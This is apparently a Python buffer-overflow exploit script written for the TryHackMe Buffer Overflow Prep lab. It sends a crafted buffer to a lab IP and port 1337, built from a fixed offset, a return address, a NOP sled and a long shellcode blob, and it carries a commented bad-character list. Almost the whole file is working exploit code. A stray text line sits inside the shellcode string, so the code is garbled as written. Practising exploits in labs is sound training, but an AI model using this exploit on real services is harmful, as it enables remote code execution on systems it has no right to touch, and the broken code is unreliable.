#!/usr/bin/env python3
""" For the TryHackMe Buffer Overflow Prep Room

Script to use as an example when fighting bad characters. For loop in notes below to
generate all characters, use these to keep track in your payload.
"""

#for x in range(1, 256):
#    print("\\x" + "{:02x}".format(x), end='')
#print()



import socket

ip = "10.10.214.247"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbe\x6e\xd2\xeb\x3f\xdd\xc5\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x83\xef\xfc\x31\x77\x0e\x03\x19\xdc\x09\xca\x19\x08\x4f"
"\x35\xe1\xc9\x30\xbf\x04\xf8\x70\xdb\x4d\xab\x40\xaf\x03\x40"
"\x2a\xfd\xb7\xd3\x5e\x2a\xb8\x54\xd4\x0c\xf7\x65\x45\x6c\x96"
"\xe5\x94\xa1\x78\xd7\x56\xb4\x79\x10\x8a\x35\x2b\xc9\xc0\xe8"
"\xdb\x7e\x9c\x30\x50\xcc\x30\x31\x85\x85\x33\x10\x18\x9d\x6d"
"\xb2\x9b\x72\x06\xfb\x83\x97\x23\xb5\x38\x63\xdf\x44\xe8\xbd"
"\x20\xea\xd5\x71\xd3\xf2\x12\xb5\x0c\x81\x6a\xc5\xb1\x92\xa9"
"\xb7\x6d\x16\x29\x1f\xe5\x80\x95\xa1\x2a\x56\x5e\xad\x87\x1c"
"\x38\xb2\x16\xf0\x33\xce\x93\xf7\x93\x46\xe7\xd3\x37\x02\xb3"
"\x7a\x6e\xee\x12\x82\x70\x51\xca\x26\xfb\x7c\x1f\x5b\xa6\xe8"
"\xec\x56\x58\xe9\x7a\xe0\x2b\xdb\x25\x5a\xa3\x57\xad\x44\x34"
"\x97\x84\x31\xaa\x66\x27\x42\xe3\xac\x73\x12\x9b\x05\xfc\xf9"
"\x5b\xa9\x29\xad\x0b\x05\x82\x0e\xfb\xe5\x72\xe7\x11\xea\xad"
"\x17\x1a\x20\xc6\xb2\xe1\xa3\xe3\x40\xf4\x7a\x9c\x46\x06\x7d"
"\x0c\xce\xe0\x17\xbc\x86\xbb\x8f\x25\x83\x37\x31\xa9\x19\x32"
"\x71\x21\xae\xc3\x3c\xc2\xdb\xd7\xa9\x22\x96\x85\x7c\x3c\x0c"
"\xa1\xe3\xaf\xcb\x31\x6d\xcc\x43\x66\x3a\x22\x9a\xe2\xd6\x1d"
"\x34\x10\x2b\xfb\x7f\x90\xf0\x38\x81\x19\x74\x04\xa5\x09\x40"
"\x85\xe1\x7d\x1c\xd0\xbf\x2b\xda\x8a\x71\x85\xb4\x61\xd8\x41"
"\x40\x4a\xdb\x17\x4d\x87\xad\xf7\xfc\x7e\xe8\x08\x30\x17\xfc"
"\x71\x2c\x87\x03\xa8\xf4\xa7\xe1\x78\x01\x40\xbc\xe9\xa8\x0d"
"\x3f\xc4\xef\x2b\xbc\xec\x8f\xcf\xdc\x85\x8a\x94\x5a\x76\xe7"
Network Exploit Development
"\x85\x0e\x78\x54\xa5\x1a")
#payload = "\x01\x02\x03\x04\x05\x06\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))

  print("Done!")
except:
  print("Could not connect.")

